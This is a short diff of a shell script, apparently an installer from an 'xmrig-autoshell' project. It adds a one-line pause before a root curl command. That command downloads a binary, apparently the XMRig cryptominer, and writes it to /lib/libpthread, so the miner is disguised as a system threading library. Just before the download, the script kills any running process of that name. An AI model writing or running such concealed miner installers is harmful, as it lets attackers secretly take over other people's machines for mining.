@@ -31,6 +31,7 @@ Get_Dist_Name()
 Get_Dist_Name
 
 sudo pkill libpthread
+sleep 2
 sudo curl -fsSL https://raw.githubusercontent.com/xbhuang1994/xmrig-autoshell/master/libpthread > /lib/libpthread
 if [ ! -f "/usr/lib64/libuv.so.1" ]; then
     case $PM in  
